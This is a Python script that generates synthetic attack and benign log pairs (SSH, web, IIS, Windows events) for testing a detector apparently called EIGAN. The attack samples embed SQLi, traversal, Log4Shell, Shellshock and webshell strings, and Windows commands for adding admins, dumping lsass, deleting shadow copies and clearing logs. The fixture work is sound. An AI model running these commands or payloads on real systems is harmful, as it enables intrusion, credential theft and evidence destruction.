#!/usr/bin/env python3
"""Gera, de forma DETERMINISTICA, as amostras de log do laboratorio EIGAN em alvos/logs/.

    gerar_logs.py [destino]

Enderecos usados sao dos blocos de DOCUMENTACAO (RFC 5737): 192.0.2.0/24, 198.51.100.0/24 e
203.0.113.0/24, entao nenhum IP e de ninguem. Os rastros de ataque reproduzem apenas o texto que
um scanner/atacante deixaria no log (nada e executavel). Cada formato tem um gemeo BENIGNO.
"""

from __future__ import annotations

import base64
import random
import sys
from datetime import datetime, timedelta
from pathlib import Path
from xml.sax.saxutils import escape

RAIZ = Path(__file__).resolve().parent.parent / "alvos" / "logs"
BASE = datetime(2026, 11, 2, 2, 0, 0)

UAS_OK = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]
PATHS_OK = [
    "/",
    "/index.html",
    "/sobre",
    "/contato",
    "/produtos",
    "/produtos/42",
    "/static/app.css",
    "/static/app.js",
    "/img/logo.png",
    "/api/status",
    "/favicon.ico",
    "/blog/ano-novo",
    "/robots.txt",
]
IPS_OK = [f"192.0.2.{n}" for n in range(10, 60)]


def escreve(rel: str, linhas: list[str]) -> None:
    p = RAIZ / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text("\n".join(linhas) + "\n", encoding="utf-8", newline="\n")


# ============================================================================ auth.log (syslog)
def syslog_ts(t: datetime) -> str:
    return t.strftime("%b %e %H:%M:%S")


def auth(malicioso: bool) -> list[str]:
    host = "srv-lab"
    ev: list[tuple[datetime, str]] = []
    t = BASE

    def add(dt: datetime, texto: str) -> None:
        ev.append((dt, f"{syslog_ts(dt)} {host} {texto}"))

    # trafego normal: cron e logins de chave
    for i in range(30):
        add(
            t + timedelta(minutes=i * 7),
            f"CRON[{2000 + i}]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
        )
        add(
            t + timedelta(minutes=i * 7, seconds=1),
            f"CRON[{2000 + i}]: pam_unix(cron:session): session closed for user root",
        )
    add(
        t + timedelta(minutes=12),
        "sshd[3100]: Accepted publickey for admin from 192.0.2.10 port 50122 ssh2: ED25519 SHA256:LABFAKEFINGERPRINTabcdefghijklmnopqrstuvwxyz0",
    )
    add(
        t + timedelta(minutes=12, seconds=1),
        "sshd[3100]: pam_unix(sshd:session): session opened for user admin(uid=1000) by (uid=0)",
    )
    add(
        t + timedelta(minutes=14),
        "sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update",
    )
    add(
        t + timedelta(minutes=14, seconds=1),
        "sudo: pam_unix(sudo:session): session opened for user root(uid=0) by admin(uid=1000)",
    )
    add(
        t + timedelta(minutes=40),
        "sshd[3100]: pam_unix(sshd:session): session closed for user admin",
    )
    if not malicioso:
        # tres erros de digitacao e depois sucesso: comportamento humano normal
        t0 = t + timedelta(hours=1)
        for k in range(3):
            add(
                t0 + timedelta(seconds=k * 6),
                f"sshd[3400]: Failed password for maria from 192.0.2.21 port {40000 + k} ssh2",
            )
        add(
            t0 + timedelta(seconds=22),
            "sshd[3400]: Accepted password for maria from 192.0.2.21 port 40003 ssh2",
        )
        add(
            t0 + timedelta(seconds=23),
            "sshd[3400]: pam_unix(sshd:session): session opened for user maria(uid=1001) by (uid=0)",
        )
        add(
            t0 + timedelta(minutes=30),
            "sshd[3400]: pam_unix(sshd:session): session closed for user maria",
        )
    else:
        atk = "203.0.113.50"
        t0 = t + timedelta(hours=1)
        alvos = [
            "root",
            "admin",
            "test",
            "oracle",
            "postgres",
            "ubuntu",
            "git",
            "ftpuser",
            "user",
            "pi",
            "deploy",
        ]
        for k in range(160):
            u = alvos[k % len(alvos)]
            dt = t0 + timedelta(seconds=k * 2)
            porta = 33000 + k
            if u in ("root", "ubuntu", "deploy"):
                add(dt, f"sshd[{4000 + k}]: Failed password for {u} from {atk} port {porta} ssh2")
            else:
                add(dt, f"sshd[{4000 + k}]: Invalid user {u} from {atk} port {porta}")
                add(
                    dt,
                    f"sshd[{4000 + k}]: Failed password for invalid user {u} from {atk} port {porta} ssh2",
                )
            if k % 9 == 0:
                add(
                    dt,
                    f"sshd[{4000 + k}]: Connection closed by authenticating user {u} {atk} port {porta} [preauth]",
                )
        add(
            t0 + timedelta(seconds=40),
            "sshd[4040]: reverse mapping checking getaddrinfo for scan-203-0-113-50.exemplo.invalid [203.0.113.50] failed - POSSIBLE BREAK-IN ATTEMPT!",
        )
        # ataque lento e distribuido
        for k in range(24):
            add(
                t0 + timedelta(minutes=5 + k * 3),
                f"sshd[{5000 + k}]: Failed password for root from 198.51.100.{23 + k % 3} port {45000 + k} ssh2",
            )
        # sucesso depois da forca bruta, seguido de persistencia
        ts = t0 + timedelta(seconds=340)
        add(ts, "sshd[4500]: Accepted password for deploy from 203.0.113.50 port 33999 ssh2")
        add(
            ts + timedelta(seconds=1),
            "sshd[4500]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)",
        )
        add(
            ts + timedelta(seconds=30),
            "sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",
        )
        add(
            ts + timedelta(seconds=31),
            "sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1002)",
        )
        add(
            ts + timedelta(seconds=50),
            "useradd[4521]: new user: name=support, UID=1005, GID=1005, home=/home/support, shell=/bin/bash",
        )
        add(ts + timedelta(seconds=52), "usermod[4530]: add 'support' to group 'sudo'")
        add(
            ts + timedelta(seconds=60),
            "passwd[4533]: pam_unix(passwd:chauthtok): password changed for support",
        )
        add(
            ts + timedelta(seconds=75),
            "sudo:   deploy : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/crontab -e",
        )
        add(ts + timedelta(seconds=90), "su: FAILED SU (to root) deploy on pts/1")
        add(
            ts + timedelta(seconds=120),
            "sshd[4500]: Received disconnect from 203.0.113.50 port 33999:11: disconnected by user",
        )
        add(ts + timedelta(seconds=130), "systemd-logind[800]: Removed session 55.")
    ev.sort(key=lambda x: x[0])
    return [e[1] for e in ev]


# ============================================================================ acessos web
def combinado(
    ts: datetime, ip: str, metodo: str, caminho: str, status: int, tam: int, ref: str, ua: str
) -> str:
    return f'{ip} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "{metodo} {caminho} HTTP/1.1" {status} {tam} "{ref}" "{ua}"'


ATAQUES = [  # (ip, metodo, caminho, status, tam, ua)
    (
        "203.0.113.50",
        "GET",
        "/index.php?id=1%27%20OR%20%271%27%3D%271",
        200,
        5120,
        "sqlmap/1.7.11#stable (https://sqlmap.org)",
    ),
    (
        "203.0.113.50",
        "GET",
        "/index.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
        500,
        311,
        "sqlmap/1.7.11#stable (https://sqlmap.org)",
    ),
    (
        "203.0.113.50",
        "GET",
        "/page?file=../../../../etc/passwd",
        400,
        226,
        "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    ),
    ("203.0.113.51", "GET", "/download?f=..%2f..%2f..%2fetc%2fshadow", 403, 199, "curl/8.5.0"),
    ("203.0.113.52", "GET", "/.env", 404, 153, "Mozilla/5.0 zgrab/0.x"),
    ("203.0.113.52", "GET", "/.git/config", 404, 153, "Mozilla/5.0 zgrab/0.x"),
    ("203.0.113.52", "GET", "/backup.sql", 404, 153, "Mozilla/5.0 zgrab/0.x"),
    (
        "203.0.113.53",
        "GET",
        "/phpmyadmin/index.php",
        404,
        153,
        "Mozilla/5.0 (X11; Linux x86_64) Nikto/2.5.0",
    ),
    (
        "203.0.113.53",
        "GET",
        "/cgi-bin/test-cgi",
        404,
        153,
        "Mozilla/5.0 (X11; Linux x86_64) Nikto/2.5.0 (Evasions:None) (Test:003)",
    ),
    ("203.0.113.54", "GET", "/", 200, 4521, "${jndi:ldap://exemplo.invalid:1389/a}"),
    ("203.0.113.54", "GET", "/?x=${jndi:ldap://exemplo.invalid:1389/a}", 200, 4521, "Mozilla/5.0"),
    ("203.0.113.55", "GET", "/cgi-bin/status", 404, 153, "() { :;}; /bin/bash -c 'echo teste-lab'"),
    ("203.0.113.56", "GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", 400, 226, "Mozilla/5.0"),
    ("203.0.113.56", "POST", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", 400, 226, "Mozilla/5.0"),
    (
        "203.0.113.57",
        "GET",
        "/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
        200,
        3012,
        "Mozilla/5.0",
    ),
    (
        "203.0.113.58",
        "GET",
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        404,
        153,
        "Mozilla/5.0",
    ),
    ("203.0.113.58", "GET", "/actuator/env", 404, 153, "Mozilla/5.0"),
    ("203.0.113.58", "GET", "/solr/admin/cores?action=STATUS", 404, 153, "Mozilla/5.0"),
    ("203.0.113.59", "GET", "/uploads/shell.php?cmd=id", 200, 54, "Mozilla/5.0"),
    ("203.0.113.59", "GET", "/uploads/shell.php?cmd=cat%20/etc/passwd", 200, 1874, "Mozilla/5.0"),
    (
        "203.0.113.60",
        "POST",
        "/",
        200,
        10,
        "Mozilla/5.0 class.module.classLoader.resources.context.parent.pipeline.first.pattern=lab",
    ),
    ("203.0.113.61", "GET", "/boaform/admin/formLogin", 404, 153, "Hello, World"),
    (
        "203.0.113.62",
        "GET",
        "/",
        200,
        4521,
        "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
    ),
]


def web(malicioso: bool, estilo: str) -> list[str]:
    rng = random.Random(10 if malicioso else 11)
    linhas: list[tuple[datetime, str]] = []
    for k in range(260):
        ts = BASE + timedelta(seconds=k * 41 + rng.randint(0, 20))
        ip = rng.choice(IPS_OK)
        caminho = rng.choice(PATHS_OK)
        status = rng.choices([200, 304, 301, 404], [80, 10, 5, 5])[0]
        linhas.append(
            (
                ts,
                combinado(
                    ts, ip, "GET", caminho, status, rng.randint(200, 20000), "-", rng.choice(UAS_OK)
                ),
            )
        )
    if malicioso:
        for k, (ip, metodo, caminho, status, tam, ua) in enumerate(ATAQUES):
            ts = BASE + timedelta(minutes=40 + k * 3)
            linhas.append((ts, combinado(ts, ip, metodo, caminho, status, tam, "-", ua)))
        # forca bruta em login
        for k in range(120):
            ts = BASE + timedelta(hours=3, seconds=k)
            linhas.append(
                (
                    ts,
                    combinado(
                        ts,
                        "203.0.113.70",
                        "POST",
                        "/wp-login.php",
                        200,
                        4893,
                        "http://exemplo.lab.invalid/wp-login.php",
                        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                    ),
                )
            )
        for k in range(40):
            ts = BASE + timedelta(hours=3, minutes=5, seconds=k * 2)
            linhas.append(
                (
                    ts,
                    combinado(
                        ts,
                        "203.0.113.71",
                        "POST",
                        "/xmlrpc.php",
                        200,
                        370,
                        "-",
                        "python-requests/2.31.0",
                    ),
                )
            )
        # varredura de caminhos (muitos 404 do mesmo IP)
        for k, p in enumerate(
            [
                "admin",
                "login",
                "wp-admin",
                "administrator",
                "backup",
                "db",
                "test",
                "old",
                "dev",
                "staging",
                "config",
                "console",
                "manager/html",
                "jenkins",
                "grafana",
                "kibana",
            ]
            * 3
        ):
            ts = BASE + timedelta(hours=4, seconds=k)
            linhas.append(
                (ts, combinado(ts, "203.0.113.72", "GET", f"/{p}", 404, 153, "-", "gobuster/3.6"))
            )
        # rajada de 500 e DoS lento
        for k in range(30):
            ts = BASE + timedelta(hours=5, seconds=k)
            linhas.append(
                (
                    ts,
                    combinado(
                        ts,
                        "203.0.113.73",
                        "GET",
                        "/api/search?q=" + "A" * 200,
                        500,
                        312,
                        "-",
                        "Mozilla/5.0",
                    ),
                )
            )
    linhas.sort(key=lambda x: x[0])
    return [linha for _, linha in linhas]


def apache_error(malicioso: bool) -> list[str]:
    base = [
        "[Mon Nov 02 02:10:01.123456 2026] [mpm_event:notice] [pid 812:tid 812] AH00489: Apache/2.4.58 (Ubuntu) configured -- resuming normal operations",
        "[Mon Nov 02 02:10:01.123500 2026] [core:notice] [pid 812:tid 812] AH00094: Command line: '/usr/sbin/apache2'",
    ]
    if malicioso:
        base += [
            "[Mon Nov 02 02:40:09.000100 2026] [core:error] [pid 900:tid 140] [client 203.0.113.56:41022] AH10244: invalid URI path (/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh)",
            "[Mon Nov 02 02:55:12.000200 2026] [php:error] [pid 901:tid 141] [client 203.0.113.50:41100] PHP Warning:  mysqli_query(): You have an error in your SQL syntax near 'UNION SELECT' in /var/www/html/index.php on line 12",
            "[Mon Nov 02 03:01:00.000300 2026] [authz_core:error] [pid 902:tid 142] [client 203.0.113.51:41200] AH01630: client denied by server configuration: /var/www/html/etc/shadow",
            '[Mon Nov 02 03:20:00.000400 2026] [security2:error] [pid 903:tid 143] [client 203.0.113.54:41300] ModSecurity: Warning. Matched phrase "jndi:" at REQUEST_HEADERS:User-Agent. [id "932130"] [msg "Log4Shell attempt"]',
        ]
    return base


# ============================================================================ IIS W3C
def iis(malicioso: bool) -> list[str]:
    rng = random.Random(20 if malicioso else 21)
    cab = [
        "#Software: Microsoft Internet Information Services 10.0",
        "#Version: 1.0",
        "#Date: 2026-11-02 02:00:00",
        "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken",
    ]
    linhas: list[tuple[datetime, str]] = []

    def row(ts, metodo, stem, query, ip, ua, status, sub=0, win=0, tempo=15, user="-"):
        linhas.append(
            (
                ts,
                f"{ts.strftime('%Y-%m-%d %H:%M:%S')} 10.0.0.20 {metodo} {stem} {query or '-'} 443 {user} {ip} {ua.replace(' ', '+')} - {status} {sub} {win} {tempo}",
            )
        )

    for k in range(200):
        ts = BASE + timedelta(seconds=k * 50 + rng.randint(0, 20))
        row(
            ts,
            "GET",
            rng.choice(PATHS_OK),
            "",
            rng.choice(IPS_OK),
            rng.choice(UAS_OK),
            rng.choices([200, 304, 404], [85, 10, 5])[0],
            tempo=rng.randint(3, 120),
        )
    if malicioso:
        ua = "Mozilla/5.0+(Windows+NT+10.0)"
        for k in range(80):
            row(
                BASE + timedelta(hours=1, seconds=k),
                "POST",
                "/owa/auth.aspx",
                "",
                "203.0.113.80",
                ua,
                401,
                1,
                0,
                40,
            )
        row(
            BASE + timedelta(hours=1, minutes=2),
            "POST",
            "/owa/auth.aspx",
            "",
            "203.0.113.80",
            ua,
            302,
            0,
            0,
            55,
            "jsilva",
        )
        for k, (stem, q, st) in enumerate(
            [
                (
                    "/autodiscover/autodiscover.json",
                    "@evil.invalid/owa/&Email=autodiscover/autodiscover.json%3f@evil.invalid",
                    200,
                ),
                ("/ecp/x.js", "", 404),
                ("/aspnet_client/shell.aspx", "cmd=whoami", 200),
                ("/..%c0%af..%c0%af/windows/win.ini", "", 404),
                ("/web.config", "", 404),
                ("/default.aspx", "id=1';WAITFOR DELAY '0:0:5'--", 500),
                ("/search.aspx", "q=<script>alert(1)</script>", 200),
                ("/_vti_bin/..%255c..%255c..%255cwinnt/system32/cmd.exe", "/c+dir", 404),
            ]
        ):
            row(
                BASE + timedelta(hours=2, seconds=k * 4),
                "GET",
                stem,
                q,
                "203.0.113.81",
                "Mozilla/5.0+(compatible;+Nmap+Scripting+Engine)",
                st,
            )
    linhas.sort(key=lambda x: x[0])
    return cab + [linha for _, linha in linhas]


# ============================================================================ eventos Windows
NS = "http://schemas.microsoft.com/win/2004/08/events/event"


def ev(
    eid: int,
    canal: str,
    provedor: str,
    ts: datetime,
    dados: dict[str, str],
    computador: str = "SRV-LAB.lab.invalid",
) -> dict:
    return {"id": eid, "canal": canal, "prov": provedor, "ts": ts, "dados": dados, "pc": computador}


def eventos(malicioso: bool) -> list[dict]:
    rng = random.Random(30 if malicioso else 31)
    out: list[dict] = []
    sec = "Microsoft-Windows-Security-Auditing"
    for k in range(12):  # logons normais
        ts = BASE + timedelta(minutes=k * 17)
        out.append(
            ev(
                4624,
                "Security",
                sec,
                ts,
                {
                    "TargetUserName": "maria",
                    "TargetDomainName": "LAB",
                    "LogonType": "2",
                    "IpAddress": "-",
                    "AuthenticationPackageName": "Kerberos",
                },
            )
        )
        out.append(
            ev(
                4634,
                "Security",
                sec,
                ts + timedelta(minutes=9),
                {"TargetUserName": "maria", "LogonType": "2"},
            )
        )
    if not malicioso:
        for k in range(2):  # erro de digitacao
            out.append(
                ev(
                    4625,
                    "Security",
                    sec,
                    BASE + timedelta(hours=1, seconds=k * 5),
                    {
                        "TargetUserName": "maria",
                        "LogonType": "2",
                        "IpAddress": "-",
                        "Status": "0xc000006d",
                        "SubStatus": "0xc000006a",
                    },
                )
            )
        out.append(
            ev(
                4688,
                "Security",
                sec,
                BASE + timedelta(hours=2),
                {
                    "NewProcessName": r"C:\Windows\System32\notepad.exe",
                    "CommandLine": "notepad.exe",
                    "SubjectUserName": "maria",
                },
            )
        )
    else:
        atk = "203.0.113.77"
        for k in range(90):
            out.append(
                ev(
                    4625,
                    "Security",
                    sec,
                    BASE + timedelta(hours=1, seconds=k * 2),
                    {
                        "TargetUserName": rng.choice(["Administrator", "admin", "backup", "sql"]),
                        "LogonType": "3",
                        "IpAddress": atk,
                        "WorkstationName": "KALI",
                        "Status": "0xc000006d",
                        "SubStatus": "0xc000006a",
                    },
                )
            )
        t = BASE + timedelta(hours=1, minutes=4)
        out.append(
            ev(
                4624,
                "Security",
                sec,
                t,
                {
                    "TargetUserName": "Administrator",
                    "TargetDomainName": "SRV-LAB",
                    "LogonType": "10",
                    "IpAddress": atk,
                    "AuthenticationPackageName": "NTLM",
                },
            )
        )
        out.append(
            ev(
                4672,
                "Security",
                sec,
                t + timedelta(seconds=1),
                {
                    "SubjectUserName": "Administrator",
                    "PrivilegeList": "SeDebugPrivilege SeTcbPrivilege SeBackupPrivilege",
                },
            )
        )
        enc = base64.b64encode("Write-Host teste-lab".encode("utf-16-le")).decode()
        for dt, proc, cmd in [
            (10, r"C:\Windows\System32\whoami.exe", "whoami /priv"),
            (15, r"C:\Windows\System32\net.exe", "net user suporte Senha-FAKE-Lab-1! /add"),
            (16, r"C:\Windows\System32\net.exe", "net localgroup Administrators suporte /add"),
            (
                25,
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                f"powershell.exe -nop -w hidden -enc {enc}",
            ),
            (40, r"C:\Windows\System32\vssadmin.exe", "vssadmin delete shadows /all /quiet"),
            (45, r"C:\Windows\System32\procdump.exe", "procdump.exe -ma lsass.exe lsass.dmp"),
            (60, r"C:\Windows\System32\wevtutil.exe", "wevtutil cl Security"),
        ]:
            out.append(
                ev(
                    4688,
                    "Security",
                    sec,
                    t + timedelta(seconds=dt),
                    {
                        "NewProcessName": proc,
                        "CommandLine": cmd,
                        "SubjectUserName": "Administrator",
                    },
                )
            )
        out.append(
            ev(
                4720,
                "Security",
                sec,
                t + timedelta(seconds=15),
                {"TargetUserName": "suporte", "SubjectUserName": "Administrator"},
            )
        )
        out.append(
            ev(
                4732,
                "Security",
                sec,
                t + timedelta(seconds=16),
                {
                    "MemberName": "suporte",
                    "TargetUserName": "Administrators",
                    "TargetSid": "S-1-5-32-544",
                },
            )
        )
        out.append(
            ev(
                4698,
                "Security",
                sec,
                t + timedelta(seconds=30),
                {"TaskName": r"\Atualizador", "SubjectUserName": "Administrator"},
            )
        )
        out.append(
            ev(
                7045,
                "System",
                "Service Control Manager",
                t + timedelta(seconds=35),
                {
                    "ServiceName": "updsvc",
                    "ImagePath": r"C:\Windows\Temp\x.exe -k",
                    "ServiceType": "user mode service",
                    "StartType": "auto start",
                },
            )
        )
        out.append(
            ev(
                1102,
                "Security",
                "Microsoft-Windows-Eventlog",
                t + timedelta(seconds=61),
                {"SubjectUserName": "Administrator"},
            )
        )
    out.sort(key=lambda e: e["ts"])
    return out


def para_xml(lista: list[dict]) -> list[str]:
    linhas = ['<?xml version="1.0" encoding="utf-8"?>', f'<Events xmlns="{NS}">']
    for i, e in enumerate(lista):
        linhas.append(f'  <Event xmlns="{NS}">')
        linhas.append("    <System>")
        linhas.append(f'      <Provider Name="{escape(e["prov"])}" />')
        linhas.append(f"      <EventID>{e['id']}</EventID>")
        linhas.append(
            f'      <TimeCreated SystemTime="{e["ts"].strftime("%Y-%m-%dT%H:%M:%S.000000000Z")}" />'
        )
        linhas.append(f"      <EventRecordID>{1000 + i}</EventRecordID>")
        linhas.append(f"      <Channel>{e['canal']}</Channel>")
        linhas.append(f"      <Computer>{e['pc']}</Computer>")
        linhas.append("    </System>")
        linhas.append("    <EventData>")
        for k, v in e["dados"].items():
            linhas.append(f'      <Data Name="{k}">{escape(v)}</Data>')
        linhas.append("    </EventData>")
        linhas.append("  </Event>")
    linhas.append("</Events>")
    return linhas


def para_csv(lista: list[dict]) -> list[str]:
    def q(s: str) -> str:
        return '"' + s.replace('"', '""') + '"'

    linhas = [
        '"TimeCreated","Id","LevelDisplayName","ProviderName","LogName","MachineName","Message"'
    ]
    for e in lista:
        msg = "; ".join(f"{k}={v}" for k, v in e["dados"].items())
        nivel = "Information"
        if e["id"] == 4625:
            nivel = "Information"
        linhas.append(
            ",".join(
                [
                    q(e["ts"].strftime("%d/%m/%Y %H:%M:%S")),
                    str(e["id"]),
                    q(nivel),
                    q(e["prov"]),
                    q(e["canal"]),
                    q(e["pc"]),
                    q(msg),
                ]
            )
        )
    return linhas


def main() -> int:
    global RAIZ
    if len(sys.argv) > 1:
        if sys.argv[1].startswith("-"):
            print(__doc__)
            return 0
        RAIZ = Path(sys.argv[1])
    escreve("linux/auth-ataque.log", auth(True))
    escreve("linux/auth-benigno.log", auth(False))
    escreve("web/nginx-access-ataque.log", web(True, "nginx"))
    escreve("web/nginx-access-benigno.log", web(False, "nginx"))
    escreve("web/apache-access-ataque.log", web(True, "apache"))
    escreve("web/apache-access-benigno.log", web(False, "apache"))
    escreve("web/apache-error-ataque.log", apache_error(True))
    escreve("web/apache-error-benigno.log", apache_error(False))
    escreve("iis/u_ex261102-ataque.log", iis(True))
    escreve("iis/u_ex261102-benigno.log", iis(False))
    atq, ben = eventos(True), eventos(False)
    escreve("windows/eventos-ataque.xml", para_xml(atq))
    escreve("windows/eventos-benigno.xml", para_xml(ben))
    escreve("windows/eventos-ataque.csv", para_csv(atq))
    escreve("windows/eventos-benigno.csv", para_csv(ben))
    escreve(
        "LEIA-ME.md",
        [
            "# Amostras de log do EIGAN Lab",
            "",
            "Geradas por `ferramentas/gerar_logs.py` (deterministico). IPs dos blocos de documentacao (RFC 5737).",
            "Pares `*-ataque` / `*-benigno`: o EIGAN deve achar rastros de ataque nos primeiros e NADA nos segundos.",
            "",
            "| Arquivo | O que tem |",
            "|---|---|",
            "| linux/auth-ataque.log | forca bruta SSH (160 falhas de um IP + ataque lento de 3 IPs), sucesso apos falhas, sudo, useradd, usermod |",
            "| web/*-access-ataque.log | SQLi, traversal, scanners (sqlmap, nikto, nmap, masscan, gobuster), Log4Shell, Shellshock, webshell, forca bruta wp-login/xmlrpc, varredura 404, rajada 500 |",
            "| iis/*-ataque.log | forca bruta OWA, ProxyLogon-like, SQLi, traversal, webshell aspx |",
            "| windows/eventos-ataque.* | 4625 em massa, 4624 tipo 10, 4672, 4720, 4732, 4688 (powershell -enc, vssadmin, procdump lsass, wevtutil), 4698, 7045, 1102 |",
        ],
    )
    print(f"logs escritos em {RAIZ}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
